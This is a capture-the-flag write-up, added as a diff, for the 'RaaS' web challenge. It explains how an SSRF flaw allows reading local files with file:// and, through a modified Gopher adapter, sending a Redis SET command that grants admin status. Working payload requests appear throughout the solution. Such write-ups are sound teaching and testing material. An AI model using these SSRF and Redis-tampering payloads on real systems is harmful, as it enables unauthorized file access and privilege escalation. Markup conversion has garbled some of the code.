@@ -1,0 +1,186 @@
+<hr />
+
+<h2>description: SSRF using Gopher protocol leads to tampering of Redis key-value store</h2>
+
+<h1>RaaS</h1>
+
+<h2>Challenge</h2>
+
+<p><strong>Description:</strong> Since everything is going online, I decided to make an easy Requests as a Service Bot to make life easier, but I seem to have messed up oops!!!</p>
+
+<p><strong>Author:</strong> <a href="https://twitter.com/Captainkay11">Capt-k</a></p>
+
+<h2>Solution</h2>
+
+<h3>Local File Inclusion</h3>
+
+<p>We are able to enter a URL for the server to request. A pretty trivial LFI vulnerability exists as a result of SSRF, allowing us to view files using the <code>file://</code> protocol.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-16 at 6.59.26 PM.png" alt="" /></p>
+
+<p>Since we're provided with the Dockerfile, we know that the server code is in <code>/code/app.py</code>.</p>
+
+<p><code>
+ADD flask-server /code
+WORKDIR /code
+RUN pip install -r requirements.txt
+CMD ["python", "app.py"]
+</code></p>
+
+<p>Thus, we can request <code>file:///code/app.py</code> to view the server code.</p>
+
+<p>```http
+POST / HTTP/1.1
+Host: web.challenge.bi0s.in:6969
+Content-Length: 33</p>
+
+<p>...</p>
+
+<p>url=file%3A%2F%2F%2Fcode%2Fapp.py
+```</p>
+
+<p>Immediately, we see that a Redis database is used. The hostname is <code>redis</code>, and it is listening on port 6379.</p>
+
+<p>If a POST request is received, the <code>Requests_On_Steroids</code> function, which we will analyze later, is used to fetch the URL. Otherwise, the <code>&lt;userID&gt;_isAdmin</code> key in the Redis database is checked. If the value is "yes", then the flag is shown in the response.</p>
+
+<p>```python
+from flask import Flask, request,render<em>template,request,make</em>response
+import redis
+import time
+import os
+from utils.random import Upper<em>Lower</em>string
+from main import Requests<em>On</em>Steroids
+app = Flask(<strong>name</strong>)</p>
+
+<h1>Make a connection of the queue and redis</h1>
+
+<p>r = redis.Redis(host='redis', port=6379)</p>
+
+<h1>r.mset({"Croatia": "Zagreb", "Bahamas": "Nassau"})</h1>
+
+<h1>print(r.get("Bahamas"))</h1>
+
+<p>@app.route("/",methods=['GET','POST'])
+def index():
+    if request.method == 'POST':
+        url = str(request.form.get('url'))
+        resp = Requests<em>On</em>Steroids(url)
+        return resp
+    else: <br />
+        resp = make<em>response(render</em>template('index.html'))
+        if not request.cookies.get('userID'):
+            user=Upper<em>Lower</em>string(32)
+            r.mset({str(user+"<em>isAdmin"):"false"})
+            resp.set</em>cookie('userID', user)
+        else:
+            user=request.cookies.get('userID')
+            flag=r.get(str(user+"<em>isAdmin"))
+            if flag == b"yes":
+                resp.set</em>cookie('flag',str(os.environ['FLAG']))
+            else:
+                resp.set_cookie('flag', "NAAAN")
+        return resp</p>
+
+<p>if <strong>name</strong> == "<strong>main</strong>":
+    app.run('0.0.0.0')
+```</p>
+
+<p>It appears that we would have to overwrite our <code>&lt;userID&gt;_isAdmin</code> value. Since we have a SSRF vulnerability, we might be able to leverage it to communicate with the Redis instance.</p>
+
+<h3>Redis Over Gopher</h3>
+
+<p>In <code>main.py</code>, we can see that the <code>Requests_On_Steroids</code> function supports the Gopher protocol. Using Gopher, we can communicate with any TCP server (but of course, we would have to follow the service's higher-layer protocol). </p>
+
+<p>However, instead of <code>gopher://</code>, we must use <code>inctf://</code> instead.</p>
+
+<p>```python
+import requests, re, io, socket
+from urllib.parse import urlparse, unquote_plus
+import os
+from modules.Gophers import GopherAdapter 
+from modules.files import LocalFileAdapter </p>
+
+<p>def Requests<em>On</em>Steroids(url):
+    try:
+        s = requests.Session()
+        s.mount("inctf:", GopherAdapter())
+        s.mount('file://', LocalFileAdapter())
+        resp = s.get(url)
+        assert resp.status_code == 200
+        return(resp.text)
+    except:
+        return "SOME ISSUE OCCURED"</p>
+
+<h1>resp = s.get("butts://127.0.0.1:6379/_get dees")</h1>
+
+<p>```</p>
+
+<p>In <code>modules/Gophers.py</code>, we find the <code>GopherAdapter</code> code.</p>
+
+<p>```python
+import requests, re, io, socket
+from urllib.parse import urlparse, unquote_plus
+import os</p>
+
+<p>...</p>
+
+<p>class GopherAdapter(requests.adapters.BaseAdapter):</p>
+
+<pre><code>...
+
+def _connect_and_read(self, parsed):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(self._netloc_to_tuple(parsed.netloc))
+    msg = parsed.path.replace('/_','')
+    if hasattr(parsed, "query"):
+        msg += "\t" + parsed.query
+    msg += "\r\n"
+    print(bytes(msg, 'utf-8'))
+    s.sendall(bytes(msg, 'utf-8'))
+    f = s.makefile("rb")
+    res = b""
+    data = f.readline()
+    print(data)
+    f.close()
+    return res
+
+...
+</code></pre>
+
+<p>```</p>
+
+<p>With some Googling, we can find out that the Gopher adapter was actually modified from this <a href="https://gist.github.com/MineRobber9000/24c87d3fb50d0b942989cbe4d4da7e73">GitHub gist</a>. I wanted to find out if any changes was made from the original script, so I diff-ed the two scripts.</p>
+
+<p><img src="../../.gitbook/assets/upload_0c5ea44b408970eff89e390b45d2dae1.png" alt="" /></p>
+
+<p>Interestingly,  a line of code was modified to remove <code>/_</code> in the URL's path.</p>
+
+<p><code>python
+msg = parsed.path.replace('/_','')
+</code></p>
+
+<p>Ideally, we would send multi-line input using the <a href="https://redis.io/topics/protocol">RESP protocol</a>, but this wouldn't work because <code>urllib.parse</code> was updated to <a href="https://docs.python.org/3.6/library/urllib.parse.html#module-urllib.parse">strip newline characters</a>. </p>
+
+<p>Redis also offers inline commands, allowing us to send our commands directly, but without the above change, our inline commands (<code>parsed.path</code>) would still look like this:</p>
+
+<p><code>
+/SET &lt;userID&gt;_isAdmin "yes"
+</code></p>
+
+<p>The <code>/SET</code> command is unrecognized, leading to an error. Instead, we can leverage the replacement using the following payload:</p>
+
+<p><code>
+url=inctf://redis:6379/_SET &lt;userID&gt;_isAdmin "yes"
+</code></p>
+
+<p>The path, when replaced, would be</p>
+
+<p><code>
+SET &lt;userID&gt;_isAdmin "yes"
+</code></p>
+
+<p>which sets our <code>&lt;userID&gt;_isAdmin</code> value to "yes".</p>
+
+<p><img src="../../.gitbook/assets/image (44).png" alt="" /></p>
+
+<p>This gives us the flag: <code>inctfi{IDK_WHY_I_EVEN_USED_REDIS_HERE!!!}</code></p>
